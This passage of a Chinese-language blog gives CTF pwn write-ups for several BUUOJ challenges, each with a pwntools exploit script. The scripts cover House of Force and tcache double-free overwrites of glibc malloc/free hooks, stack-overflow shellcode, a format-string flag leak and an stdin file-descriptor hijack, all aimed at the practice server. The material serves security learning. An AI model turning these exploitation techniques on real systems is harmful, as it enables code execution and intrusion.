class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_pid</span>(<span class="params">name</span>):</span><br><span class="line">    pid_list = []</span><br><span class="line">    processes = os.popen(<span class="string">&#x27;ps -ef | grep %s&#x27;</span> % name)</span><br><span class="line">    process_info = processes.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> process_info.split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]:</span><br><span class="line">        j = re.split(<span class="string">&#x27; +&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">7</span>] == name:</span><br><span class="line">            pid_list.append(<span class="built_in">int</span>(j[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> pid_list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/git_clones/glibc_run/glibc_versions/2.23/x64/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;glibc_run&#x27;, &#x27;2.23&#x27;, &#x27;./gyctf_2020_force&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29751</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># pid = get_process_pid(&#x27;./gyctf_2020_force&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x200000</span>).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bin addr 0x&#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">libc_addr = heap_addr + <span class="number">0x200FF0</span></span><br><span class="line">__malloc_hook = libc_addr + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_addr + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__malloc_hook: &quot;</span> + <span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x18</span>).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bin addr 0x&#x27;</span>)</span><br><span class="line">heap_addr1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr1))</span><br><span class="line">top_chunk_size_addr = heap_addr1 + <span class="number">0x10</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, cyclic(<span class="number">0x18</span>) + packing.p64(__malloc_hook - top_chunk_size_addr + <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(__malloc_hook - top_chunk_size_addr - <span class="number">0x30</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;content\n&#x27;</span>, packing.p64(<span class="number">0</span>) + packing.p64(one_gadgets[<span class="number">1</span>] + libc_addr) + packing.p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(pid)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;2:puts\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;size\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu106-wdb_2018_3rd_soeasy"><a class="markdownIt-Anchor" href="#buu106-wdb_2018_3rd_soeasy"></a> buu106-wdb_2018_3rd_soEasy</h1>
<p>简单栈溢出+shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wdb_2018_3rd_soEasy&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;./wdb_2018_3rd_soEasy&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27654</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hei,give you a gift-&gt;0x&#x27;</span>)</span><br><span class="line">shell_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span> + <span class="number">4</span>)</span><br><span class="line">payload += packing.p32(shell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu107-judgement_mna_2016"><a class="markdownIt-Anchor" href="#buu107-judgement_mna_2016"></a> buu107-judgement_mna_2016</h1>
<p>字符串比较，格式化字符串漏洞直接能给flag读出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./judgement_mna_2016&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;./judgement_mna_2016&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28122</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%45$s  \x00&#x27;</span> + packing.p32(elf.symbols[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Flag judgment system\nInput flag &gt;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu108-ciscn_2019_en_3"><a class="markdownIt-Anchor" href="#buu108-ciscn_2019_en_3"></a> buu108-ciscn_2019_en_3</h1>
<p>格式化字符串泄露libc基地址，因为这个是带了检查的因此不能直接使用<code>%7$x</code>这样的参数，但是可以通过<code>%c</code>一个个往后泄露，这个是检查不了的，然后借助fastbin dup，use after free之后chunk进入tcache，可以避免fastbin中对于chunk大小的检查，因此可以分配到任意地址去，尝试了<code>__malloc_hook</code>的三个one_gadget发现都不行，因此使用<code>__free_hook</code>来完成利用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_en_3&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;glibc_run&#x27;, &#x27;2.27&#x27;, &#x27;./ciscn_2019_en_3&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26164</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_pid</span>(<span class="params">name</span>):</span><br><span class="line">    pid_list = []</span><br><span class="line">    processes = os.popen(<span class="string">&#x27;ps -ef | grep %s&#x27;</span> % name)</span><br><span class="line">    process_info = processes.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> process_info.split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]:</span><br><span class="line">        j = re.split(<span class="string">&#x27; +&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">7</span>] == name:</span><br><span class="line">            pid_list.append(<span class="built_in">int</span>(j[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> pid_list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input your choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Please input the size of story: \n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;please inpute the story: \n&#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Input your choice:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Please input the index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name?\n&#x27;</span>, <span class="string">b&#x27;%c%c%c%c%c%c%llx&#x27;</span> + packing.p64(<span class="number">0</span>) * <span class="number">2</span>)	<span class="comment"># 0x680</span></span><br><span class="line">io.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>).decode(), <span class="number">16</span>) - <span class="number">0x3ec680</span></span><br><span class="line">system = libc_base + <span class="number">0x4f440</span></span><br><span class="line">__malloc_hook = libc_base + <span class="number">0x3ebc30</span></span><br><span class="line">__free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">realloc = libc_base + <span class="number">0x98c30</span></span><br><span class="line"><span class="comment"># io.sendlineafter(b&#x27;ID.\n&#x27;, b&#x27;flag&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">	add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">one_gadgets = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">add(<span class="number">0x60</span>, packing.p64(__free_hook))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, packing.p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(get_process_pid(&#x27;./ciscn_2019_en_3&#x27;))</span></span><br><span class="line"><span class="comment"># time.sleep(1)</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu109-picoctf_2018_buffer-overflow-0"><a class="markdownIt-Anchor" href="#buu109-picoctf_2018_buffer-overflow-0"></a> buu109-picoctf_2018_buffer overflow 0</h1>
<p>略</p>
<h1 id="buu110-ciscn_2019_final_2"><a class="markdownIt-Anchor" href="#buu110-ciscn_2019_final_2"></a> buu110-ciscn_2019_final_2</h1>
<p>这是一道比较有意思的题。题目首先初始化过程中打开了flag文件，并将文件描述符设置为666。在本题中，经过理论分析发现，我们实际上可以直接获得shell，但出题人的本意显然不是这样。</p>
<p>由于glibc 2.27对于tcache double free的检查过于宽松，导致我们几乎可以无限制地在tcache上进行double free甚至多重free。因此在本题中，我们可以通过double free的方法释放出一个较大的可以被放入unsorted bin中的chunk，随后通过堆块重叠可将tcache指针修改到<code>_IO_2_1_stdin_</code>的<code>fd</code>字段，将标准输入的文件描述符从0改成666，这样标准输入就相当于重定向到了flag文件中，不过需要注意的是，在主界面菜单选择中，题目使用的是<code>read</code>函数，还是直接从文件描述符0的真标准输入读取，但在<code>bye_bye</code>中的scanf就会使用<code>_IO_2_1_stdin_</code>中的文件描述符，因此最后退出会直接输出flag的内容。</p>
<p>利用流程如下图所示。</p>
<p><img src="1.png" alt="" /></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_final_2&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;glibc_run&#x27;, &#x27;2.27&#x27;, &#x27;./ciscn_final_2&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">27552</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_pid</span>(<span class="params">name</span>):</span><br><span class="line">    pid_list = []</span><br><span class="line">    processes = os.popen(<span class="string">&#x27;ps -ef | grep %s&#x27;</span> % name)</span><br><span class="line">    process_info = processes.read()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> process_info.split(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]:</span><br><span class="line">        j = re.split(<span class="string">&#x27; +&#x27;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">7</span>] == name:</span><br><span class="line">            pid_list.append(<span class="built_in">int</span>(j[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> pid_list[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">kind, value</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(kind).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;your inode number:&#x27;</span>, <span class="built_in">str</span>(value).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">kind</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(kind).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">kind</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(kind).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>(<span class="params">content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which command?\n&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;what do you want to say at last? &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x12345678</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x12345678</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">heap_lsw = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> heap_lsw &lt; <span class="number">0</span>:</span><br><span class="line">	heap_lsw += <span class="number">65536</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_lsw))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, heap_lsw - <span class="number">0xC0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xB1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x1234</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">libc_base_lsdw = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> libc_base_lsdw &lt; <span class="number">0</span>:</span><br><span class="line">	libc_base_lsdw += <span class="number">0x1_0000_0000</span></span><br><span class="line">libc_base_lsdw -= <span class="number">0x3ebca0</span></span><br><span class="line">__free_hook = libc_base_lsdw + <span class="number">0x3ed8e8</span></span><br><span class="line">_IO_2_1_stdin_ = libc_base_lsdw + <span class="number">0x3eba00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base_lsdw))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, (_IO_2_1_stdin_ &amp; <span class="number">0xFFFF</span>) + <span class="number">112</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x12345678</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line"></span><br><span class="line">quit(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(get_process_pid(&quot;./ciscn_final_2&quot;))</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/03/20/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v2-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/" rel="prev" title="glibc 2.35 pwn——house of apple v2 示例程序">
      <i class="fa fa-chevron-left"></i> glibc 2.35 pwn——house of apple v2 示例程序
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/10/14/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/" rel="next" title="容器逃逸学习 (1)">
      容器逃逸学习 (1) <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buu102-starctf_2019_babyshell"><span class="nav-number">1.</span> <span class="nav-text"> buu102-starctf_2019_babyshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu103-actf_2019_babyheap"><span class="nav-number">2.</span> <span class="nav-text"> buu103-actf_2019_babyheap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu193-starctf2018_babystack"><span class="nav-number">3.</span> <span class="nav-text"> buu193-starctf2018_babystack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu194-ciscn_2019_s_8"><span class="nav-number">4.</span> <span class="nav-text"> buu194-ciscn_2019_s_8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu104-wustctf2020_name_your_dog"><span class="nav-number">5.</span> <span class="nav-text"> buu104-wustctf2020_name_your_dog</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu105-gyctf_2020_force"><span class="nav-number">6.</span> <span class="nav-text"> buu105-gyctf_2020_force</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu106-wdb_2018_3rd_soeasy"><span class="nav-number">7.</span> <span class="nav-text"> buu106-wdb_2018_3rd_soEasy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu107-judgement_mna_2016"><span class="nav-number">8.</span> <span class="nav-text"> buu107-judgement_mna_2016</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu108-ciscn_2019_en_3"><span class="nav-number">9.</span> <span class="nav-text"> buu108-ciscn_2019_en_3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu109-picoctf_2018_buffer-overflow-0"><span class="nav-number">10.</span> <span class="nav-text"> buu109-picoctf_2018_buffer overflow 0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buu110-ciscn_2019_final_2"><span class="nav-number">11.</span> <span class="nav-text"> buu110-ciscn_2019_final_2</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">149</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">22</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
